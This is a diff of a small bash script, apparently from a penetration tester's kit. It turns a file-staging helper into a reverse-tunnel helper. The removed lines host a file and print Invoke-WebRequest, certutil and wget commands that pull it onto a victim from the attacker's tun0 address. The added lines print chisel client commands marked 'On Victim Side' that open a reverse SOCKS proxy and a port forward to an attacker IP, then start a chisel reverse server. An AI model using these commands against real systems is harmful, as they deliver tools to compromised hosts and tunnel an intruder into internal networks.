@@ -1,27 +1,26 @@
 #!/bin/bash
 
-
-if [ "$#" -ne 1 ] || [ "$1" == "--help" ];
+if [ "$#" -ne 1 ] || [ "$1" == "--version" ];
 then
     echo "usage";
-    echo "HttpShare.sh FILE";
+    echo "tunnel.sh IP";
     exit;
 fi 
 
-FILE=$1;
+IP=$1;
 
-myip=$(ifconfig | grep -A1 tun0 | grep -i inet | awk '{print $2}');
 
+echo "***** On Victim Side *****"
 echo ""
-echo Invoke-WebRequest -Uri \"http://$myip/$FILE\" -OutFile \"$FILE\" 
+echo "chisel_amd64.exe client $IP:8001 R:9001:socks"
 echo ""
+echo "**************************"
 
+echo "***** On Victim Side (Specific port)*****"
 echo ""
-echo certutil.exe -urlcache -f http://$myip/$FILE $FILE 
+echo "./chisel client $IP:8001 R:8000:127.0.0.1:8000"
 echo ""
+echo "**************************"
 
-echo ""
-echo wget http://$myip/$FILE
-echo ""
 
-python -m http.server 80
+chisel server --reverse --port 8001
